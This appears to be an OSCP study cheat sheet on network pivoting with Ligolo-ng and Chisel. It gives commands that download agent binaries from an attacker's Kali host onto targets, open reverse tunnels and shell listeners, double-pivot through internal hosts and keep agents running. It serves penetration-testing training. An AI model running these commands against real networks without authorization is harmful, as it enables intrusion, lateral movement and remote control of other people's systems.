---
title: "Ligolo-ng"
date: 2026-06-20
weight: 120
draft: false
tags: ["oscp", "cheatsheet"]
summary: "TUN-interface pivoting tool. Enumerate internal subnets directly without proxychains."
---

TUN-interface pivoting tool. You can enumerate internal subnets directly without proxychains.

- Source: https://heretek.dev/oscp-cheatsheet/ligolo-ng/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host (internal subnet), `KALI_IP` = attacker Kali IP

- Binaries: `~/Tools/ligolo-ng/` (proxy=linux-arm64, agents=linux-amd64 + windows-amd64)

## 1 — Setup (Kali — must be repeated after every reboot)

```bash
# Create TUN interface (resets every reboot)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy (ALWAYS set -api-laddr to avoid port conflict with BloodHound)
~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8443
```

- `-selfcert` = auto-generate a TLS certificate. The agent accepts it with `-ignore-cert`.
- `-api-laddr` = move the Ligolo web UI off 8080 to another port (BloodHound uses 8080).
- (Important) Port conflict warning: recent Ligolo-NG has a default web dashboard on 8080. Running without `-api-laddr` steals BloodHound's port.

Port assignments (memorize):

- BloodHound CE: 8080
- Burp Suite: 8081 (change from the default 8080 in Burp settings)
- Ligolo proxy listener: 11601
- Ligolo dashboard: 8443 (set with -api-laddr)

If you need to restart Ligolo during a session:

1. Note the agent command used on the target
2. Stop the proxy on Kali with `Ctrl+C`
3. Restart with the same command as above
4. Re-run the agent on the target — it reconnects
5. Ligolo console: `session` → select → `start`
6. Routes are preserved (already added) — verify with `ping`

- (Note) The OSCP lab resets daily. Every morning: create TUN → start proxy → re-upload agent → reconnect → re-add routes. Save the setup commands as a script.

## 2 — Upload the agent to the target

### Windows

```powershell
# certutil (AV may flag — try alternatives if blocked)
certutil -urlcache -f http://KALI_IP/agent.exe C:\Windows\Temp\agent.exe

# PowerShell
iwr http://KALI_IP/agent.exe -OutFile C:\Windows\Temp\agent.exe

# SMB (no disk write — runs from share)
copy \\KALI_IP\share\agent.exe C:\Windows\Temp\agent.exe
```

### Linux

```bash
wget http://KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent
# or
curl http://KALI_IP/agent -o /tmp/agent && chmod +x /tmp/agent
```

### Serving files from Kali

```bash
# Python HTTP server (simple)
cd ~/Tools/ligolo-ng && python3 -m http.server 80

# SMB share (better for Windows — avoids AMSI/AV on download)
impacket-smbserver share ~/Tools/ligolo-ng -smb2support
```

## 3 — Connect the agent

```bash
# Windows
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# Linux
/tmp/agent -connect KALI_IP:11601 -ignore-cert
```

The agent reports its connection to the proxy console on Kali.

## 4 — Routing (reaching the internal subnet)

```bash
# In ligolo proxy console:
session                           # pick the agent session (by number)
ifconfig                          # check target's interfaces — find internal subnet
start                             # activate the tunnel on the ligolo TUN

# On Kali (new terminal):
sudo ip route add $TARGET/24 dev ligolo
# Replace with the actual internal subnet from ifconfig output
# ⚠️ Use /24 — a typo like /2 will break routing silently
```

Now every Kali tool (nmap, netexec, evil-winrm, etc.) behaves as if directly connected to `$TARGET/24`.

```bash
# Verify
ping -c1 $TARGET
netexec smb $TARGET/24
```

## 5 — Listeners (catching reverse shells from internal machines)

- Internal machines cannot reach Kali directly. Forward the port through the pivot with a ligolo listener.

```bash
# In ligolo proxy console (on the active session):
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp      # for serving files
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp     # alt port

# List active listeners
listener_list

# Remove a listener
listener_stop <id>
```

- How it works: the internal target connects to `PIVOT_HOST:4444` → ligolo forwards to `KALI:4444`.

```bash
# On Kali — start your listener as normal
nc -lvnp 4444

# On internal target — point shell at the PIVOT host (not Kali)
# PowerShell reverse shell example:
powershell -e <BASE64_PAYLOAD_POINTING_TO_PIVOT_IP:4444>
```

- The internal machine believes it is talking to the pivot host. Ligolo tunnels this to Kali.

### Alternative: Chisel (when listener_add fails or there is no pivot)

Use chisel when: the target is directly reachable (no pivot needed), a one-shot RCE cannot keep the ligolo agent alive (Text4Shell, etc.), or target egress is filtered to 80/443.

```bash
# === STEP 1: Kali — start chisel server ===
~/Tools/chisel server -p 8000 --reverse
# Use -p 80 or -p 443 if egress is filtered

# === STEP 2: Target — upload chisel binary ===
wget http://KALI_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
# Windows: certutil -urlcache -f http://KALI_IP/chisel.exe C:\Windows\Temp\chisel.exe

# === STEP 3: Target — connect client (pick ONE spec) ===
./chisel client KALI_IP:8000 R:socks                       # SOCKS proxy on Kali:1080
./chisel client KALI_IP:8000 R:4444:127.0.0.1:4444         # catch reverse shell on Kali:4444
./chisel client KALI_IP:8000 R:9999:127.0.0.1:8080         # expose target's localhost:8080 → Kali:9999
```

One-shot RCE (Runtime.exec does not parse a shell — you must wrap it) (important):

```bash
bash -c "nohup /tmp/chisel client KALI_IP:8000 R:4444:127.0.0.1:4444 >/dev/null 2>&1 &"
```

- Spec format: `R:<kali_port>:<target_host>:<target_port>`. `R:` reverses the direction — the client connects and the port opens on Kali.

## 6 — Double pivot (two hops deep)

Scenario: `Kali → Host A (DMZ) → Host B (internal) → Host C (deeper subnet)`

### Step 1: First pivot (Kali → Host A)

```bash
# Already done: agent on Host A connected, route to internal subnet added
sudo ip route add $TARGET/24 dev ligolo      # Host B's subnet
```

### Step 2: Upload an agent to Host B through the tunnel

```bash
# Serve agent on Kali
python3 -m http.server 80

# Add listener so Host B can reach Kali's HTTP server through Host A
# In ligolo console (session = Host A):
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp

# On Host B (via evil-winrm or shell through first tunnel):
wget http://HOST_A_INTERNAL_IP/agent -O /tmp/agent && chmod +x /tmp/agent
```

### Step 3: Make Host B's agent reach the Kali proxy

```bash
# Add listener on Host A to forward ligolo port back to Kali
# In ligolo console (session = Host A):
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# On Host B — connect agent through Host A
/tmp/agent -connect HOST_A_INTERNAL_IP:11601 -ignore-cert
```

### Step 4: Route the deeper subnet

```bash
# New session appears in proxy console — select it
session                           # pick Host B's session

# Create second TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Start tunnel on the new interface
start --tun ligolo2

# Add route to deeper subnet
sudo ip route add $TARGET/24 dev ligolo2
```

Now Kali tools reach `$TARGET/24` across two hops.

- To catch a reverse shell from the deepest subnet, chain listeners on both Host B and Host A.

## Troubleshooting

- Agent connects but yamux keeps dying → reset the TARGET box. A zombie agent process from a previous session can interfere even after taskkill. If that fails, restart the proxy on Kali
- Agent never connects → check the pivot firewall, confirm port 11601 is open, try the `-retry` flag
- "Device for nexthop is not up" → the TUN interface does not exist yet. Run `sudo ip tuntap add` + `ip link set up` first
- Route add "Invalid prefix" → check the CIDR — it must be `/24`. Watch for typos like `/2` or `/254`
- Route added but no connectivity → confirm `start` was run in the proxy console; check `ip route` on Kali
- Tool times out through the tunnel → some tools need long timeouts; for nmap use `-T3 --max-retries 2`
- Multiple subnets behind one pivot → add multiple routes to the same ligolo interface
- DNS resolution through the tunnel → add the internal DNS to `/etc/resolv.conf` or use IPs directly
- Agent dies on reboot → run the agent as a service or scheduled task for persistence

## OSCP Exam Checklist

```text
[ ] TUN interface created: sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
[ ] Proxy running: ~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8443
[ ] Agent uploaded and connected from first pivot
[ ] Internal subnet route added (double-check /24 not typo)
[ ] Listener set up for reverse shells (port 4444 + port 80)
[ ] Verified connectivity: ping or netexec sweep of internal subnet
[ ] If double pivot needed: second TUN (ligolo2), second agent, chained listeners
[ ] Burp moved to 8081 (not conflicting with BloodHound 8080)
```
